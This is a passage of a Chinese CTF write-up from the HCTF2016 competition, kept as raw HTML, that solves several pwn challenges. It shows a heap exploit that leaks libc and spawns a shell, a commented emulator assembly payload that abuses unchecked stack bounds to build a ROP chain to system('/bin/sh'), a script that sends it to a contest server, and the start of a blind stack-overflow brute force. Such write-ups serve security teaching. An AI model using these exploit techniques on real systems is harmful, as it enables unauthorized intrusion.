spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">read_addr&nbsp;=&nbsp;l64(data[:8].ljust(8,&nbsp;'\x00'))</code></div><div class="line number171 index170 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"read_addr:",&nbsp;hex(read_addr)</code></div><div class="line number172 index171 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;[c&nbsp;for&nbsp;c&nbsp;in&nbsp;data]</code></div><div class="line number173 index172 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number174 index173 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">offset&nbsp;=&nbsp;-0xb12e0</code></div><div class="line number175 index174 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;offset&nbsp;==&nbsp;0:</code></div><div class="line number176 index175 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#d&nbsp;=&nbsp;DynELF(leak_addr,&nbsp;proc_addr)</code></div><div class="line number177 index176 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;=&nbsp;DynELF(leak_addr,&nbsp;proc_addr,&nbsp;elf=ELF('./fheap'))</code></div><div class="line number178 index177 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">system_addr&nbsp;=&nbsp;d.lookup('system',&nbsp;'libc')</code></div><div class="line number179 index178 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"system_addr:",&nbsp;hex(system_addr)</code></div><div class="line number180 index179 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number181 index180 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">offset&nbsp;=&nbsp;system_addr&nbsp;-&nbsp;read_addr</code></div><div class="line number182 index181 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"offset:",&nbsp;hex(offset)</code></div><div class="line number183 index182 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number184 index183 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">system_addr&nbsp;=&nbsp;read_addr&nbsp;+&nbsp;offset</code></div><div class="line number185 index184 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"system_addr:",&nbsp;hex(system_addr)</code></div><div class="line number186 index185 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number187 index186 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">get_shell(system_addr)</code></div><div class="line number188 index187 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number189 index188 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number190 index189 alt1"><code class="plain plain">import&nbsp;time</code></div><div class="line number191 index190 alt2"><code class="plain plain">while&nbsp;True:</code></div><div class="line number192 index191 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">try:</code></div><div class="line number193 index192 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io&nbsp;=&nbsp;get_io(target)</code></div><div class="line number194 index193 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;pwn(io)&nbsp;==&nbsp;False:</code></div><div class="line number195 index194 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number196 index195 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">except&nbsp;Exception,&nbsp;e:</code></div><div class="line number197 index196 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#raise</code></div><div class="line number198 index197 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">pass</code></div><div class="line number199 index198 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number200 index199 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">time.sleep(2)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">flag如下：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t019f497137c31a24d0.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t019f497137c31a24d0.png" title="t01e407cacf8d0fd505.png" alt="http://p8.qhimg.com/t01e407cacf8d0fd505.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ASM</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">程序实现了一个代码仿真器，他提供了一系列的类x86指令，功能也类似，并提供了make_code，能对汇编代码进行转换，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">里面的重点指令功能：lea dst,src 能够实现将src(寄存器或者内存地址)的地址取出来，并放到dst中去，所以可以通过lea r1,r0,取得r0的内存地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过栈实现任意地址读写：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0113cbdb2c82518052.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0113cbdb2c82518052.png" title="t01f25048a4dc256d9c.png" alt="http://p1.qhimg.com/t01f25048a4dc256d9c.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在内存布局中，有以下关系：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">|…..Libc……..|</code></div><div class="line number2 index1 alt1"><code class="plain plain">|…..data…….|</code></div><div class="line number3 index2 alt2"><code class="plain plain">|…..heap…….|</code></div><div class="line number4 index3 alt1"><code class="plain plain">|…..stack……|</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">仿真器中的堆栈在程序中的heap中，而在pop（伪栈下移）时，未检测上界限，可以泄露上面的地址（取内存中值），在push（伪栈上移）时，未检测下界限，可以改写stack的地址（写内存值）。而sp可以直接通过mov等指令进行改写。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">泄露的libc地址可以用仿真器的寄存器存储，并找到libc中environ的位置，从而得到栈的地址，该libc直接通过libc_database可以查到，最终在栈中布置好rop，在仿真代码结束后，即可获取shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用脚本系列如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取shell的带注释的asm文件如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">data:</code></div><div class="line number2 index1 alt1"><code class="plain plain">0x6c6c6568,0x726f776f,0x646c</code></div><div class="line number3 index2 alt2"><code class="plain plain">end</code></div><div class="line number4 index3 alt1"><code class="plain plain">lea&nbsp;r0,r0</code></div><div class="line number5 index4 alt2"><code class="plain plain">sub&nbsp;r1,r0,0x3054</code></div><div class="line number6 index5 alt1"><code class="plain plain">;set&nbsp;read_got</code></div><div class="line number7 index6 alt2"><code class="plain plain">add&nbsp;r0,r1,0x3010</code></div><div class="line number8 index7 alt1"><code class="plain plain">;leak&nbsp;info&nbsp;in&nbsp;r0:&nbsp;&nbsp;r2&nbsp;=&nbsp;[r0]</code></div><div class="line number9 index8 alt2"><code class="plain plain">mov&nbsp;r2,sp</code></div><div class="line number10 index9 alt1"><code class="plain plain">mov&nbsp;sp,r0</code></div><div class="line number11 index10 alt2"><code class="plain plain">pop&nbsp;r0</code></div><div class="line number12 index11 alt1"><code class="plain plain">mov&nbsp;sp,r2</code></div><div class="line number13 index12 alt2"><code class="plain plain">mov&nbsp;r2,r0</code></div><div class="line number14 index13 alt1"><code class="plain plain">;libc_base&nbsp;addr</code></div><div class="line number15 index14 alt2"><code class="plain plain">sub&nbsp;r0,r2,0xd41c0</code></div><div class="line number16 index15 alt1"><code class="plain plain">push&nbsp;r0</code></div><div class="line number17 index16 alt2"><code class="plain plain">;leak&nbsp;environ_got</code></div><div class="line number18 index17 alt1"><code class="plain plain">add&nbsp;r0,r0,0x001b1dbc</code></div><div class="line number19 index18 alt2"><code class="plain plain">;show&nbsp;info</code></div><div class="line number20 index19 alt1"><code class="plain plain">;mov&nbsp;r2,r0</code></div><div class="line number21 index20 alt2"><code class="plain plain">;push&nbsp;r2</code></div><div class="line number22 index21 alt1"><code class="plain plain">;call&nbsp;puts</code></div><div class="line number23 index22 alt2"><code class="plain plain">;mov&nbsp;r0,r2</code></div><div class="line number24 index23 alt1"><code class="plain plain">;leak&nbsp;environ_addr</code></div><div class="line number25 index24 alt2"><code class="plain plain">mov&nbsp;r2,sp</code></div><div class="line number26 index25 alt1"><code class="plain plain">mov&nbsp;sp,r0</code></div><div class="line number27 index26 alt2"><code class="plain plain">pop&nbsp;r0</code></div><div class="line number28 index27 alt1"><code class="plain plain">mov&nbsp;sp,r2</code></div><div class="line number29 index28 alt2"><code class="plain plain">mov&nbsp;r2,r0</code></div><div class="line number30 index29 alt1"><code class="plain plain">;ret&nbsp;addr</code></div><div class="line number31 index30 alt2"><code class="plain plain">sub&nbsp;r2,r2,0xd0</code></div><div class="line number32 index31 alt1"><code class="plain plain">;push&nbsp;r2</code></div><div class="line number33 index32 alt2"><code class="plain plain">add&nbsp;r2,r2,0xC</code></div><div class="line number34 index33 alt1"><code class="plain plain">#get&nbsp;libc_base</code></div><div class="line number35 index34 alt2"><code class="plain plain">pop&nbsp;r1</code></div><div class="line number36 index35 alt1"><code class="plain plain">;set&nbsp;addr&nbsp;at&nbsp;r2</code></div><div class="line number37 index36 alt2"><code class="plain plain">mov&nbsp;sp,r2</code></div><div class="line number38 index37 alt1"><code class="plain plain">#binsh_addr</code></div><div class="line number39 index38 alt2"><code class="plain plain">add&nbsp;r0,r1,0x158e8b</code></div><div class="line number40 index39 alt1"><code class="plain plain">push&nbsp;r0</code></div><div class="line number41 index40 alt2"><code class="plain plain">#system_addr</code></div><div class="line number42 index41 alt1"><code class="plain plain">add&nbsp;r0,r1,0x0003a940</code></div><div class="line number43 index42 alt2"><code class="plain plain">push&nbsp;r0</code></div><div class="line number44 index43 alt1"><code class="plain plain">add&nbsp;r0,r1,0x0003a940</code></div><div class="line number45 index44 alt2"><code class="plain plain">push&nbsp;r0</code></div><div class="line number46 index45 alt1"><code class="plain plain">;show&nbsp;info</code></div><div class="line number47 index46 alt2"><code class="plain plain">;push&nbsp;r2</code></div><div class="line number48 index47 alt1"><code class="plain plain">;call&nbsp;puts</code></div><div class="line number49 index48 alt2"><code class="plain plain">;push&nbsp;r2</code></div><div class="line number50 index49 alt1"><code class="plain plain">;call&nbsp;puts</code></div><div class="line number51 index50 alt2"><code class="plain plain">;push&nbsp;r2</code></div><div class="line number52 index51 alt1"><code class="plain plain">;call&nbsp;puts</code></div><div class="line number53 index52 alt2"><code class="plain plain">$</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对上述asm文件去注释脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">file_r&nbsp;=&nbsp;open("do_work.asm",&nbsp;'r')</code></div><div class="line number2 index1 alt1"><code class="plain plain">info&nbsp;=&nbsp;file_r.readlines()</code></div><div class="line number3 index2 alt2"><code class="plain plain">file_r.close()</code></div><div class="line number4 index3 alt1"><code class="plain plain">file_w&nbsp;=&nbsp;open("do_work_real.asm",&nbsp;'w')</code></div><div class="line number5 index4 alt2"><code class="plain plain">for&nbsp;line&nbsp;in&nbsp;info:</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;line.startswith(";"):</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;line.startswith("#"):</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(line.strip())&nbsp;==&nbsp;0:</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">file_w.write(line)</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number14 index13 alt1"><code class="plain plain">file_w.close()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取shell脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;zio&nbsp;import&nbsp;*</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">target&nbsp;=&nbsp;"./pwn"</code></div><div class="line number4 index3 alt1"><code class="plain plain">target&nbsp;=&nbsp;("115.28.78.54",&nbsp;23333)</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">def&nbsp;get_io(target):</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">r_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"green")</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">w_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"blue")</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m)</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;io</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number12 index11 alt1"><code class="plain plain">def&nbsp;pwn(io):</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until(":")</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline("927e613a91620da8c5f10936faf70f4dgDR95OLX")</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until("!\n")</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">file_r&nbsp;=&nbsp;open("1.bin",&nbsp;"rb")</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;file_r.read()</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">file_r.close()</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">sinal&nbsp;=&nbsp;"give&nbsp;me&nbsp;your&nbsp;code,&nbsp;end&nbsp;with&nbsp;a&nbsp;single&nbsp;line&nbsp;of&nbsp;'$'\n"</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">data&nbsp;=&nbsp;data.replace(sinal,&nbsp;"")</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#print&nbsp;data</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.gdb_hint()</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#data&nbsp;=&nbsp;data.ljust(0x300,&nbsp;'a')</code></div><div class="line number29 index28 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.write(data)</code></div><div class="line number30 index29 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number31 index30 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.interact()</code></div><div class="line number32 index31 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number33 index32 alt2"><code class="plain plain">io&nbsp;=&nbsp;get_io(target)</code></div><div class="line number34 index33 alt1"><code class="plain plain">pwn(io)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">转换bin文件并执行脚本run.sh：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">python compiler.py</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">./make_code &lt; do_work_real.asm &gt; 1.bin</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">python pwn.py</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">flag如下：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d9bf117015e4c208.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d9bf117015e4c208.png" title="t018c3f42ace5a7085b.png" alt="http://p9.qhimg.com/t018c3f42ace5a7085b.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">出题人失踪了</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因为没有给bin，根据两个提示，感觉可能是一个栈溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">猜测没有开启pie，所以基地址为0x08048000或者0x400000。最开始尝试0x08048000,没有任何发现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">经过测试，当输入字符超过72字节时，程序不会回显No password, No game。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构造如下payload爆破，发现当i=0x711时，程序会正常打印No password, No game，而i=0x70c时，程序会继续等待输入。所以可以推断0x40070c为call指令，调用漏洞函数，0x400711为函数返回地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">for&nbsp;i&nbsp;in&nbsp;range(0,&nbsp;0x1000):</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(0x0400000+i)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft 